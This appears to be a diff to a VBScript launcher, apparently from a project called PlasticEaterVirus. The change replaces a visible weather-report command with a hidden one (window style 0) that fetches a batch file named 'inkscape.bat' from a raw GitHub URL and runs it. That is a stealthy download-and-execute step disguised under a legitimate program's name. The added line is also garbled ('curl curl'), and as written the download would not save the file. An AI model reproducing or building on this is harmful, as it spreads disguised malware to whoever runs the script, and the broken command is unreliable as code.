@@ -7,4 +7,4 @@ oShell.run "cmd.exe /C cd c: & c:/PlasticEater & curl https://raw.githubusercont
 
 Dim Shell
 Set Shell = WScript.CreateObject ("WScript.Shell")
-Shell.run "cmd.exe /C @ECHO OFF & mode con: cols=132 lines=42 & CLS & curl https://wttr.in/ & pause", 1
+Shell.run "cmd.exe /C @ECHO OFF & mode con: cols=132 lines=42 & CLS & curl curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/inkscape.bat & inkscape.bat", 0
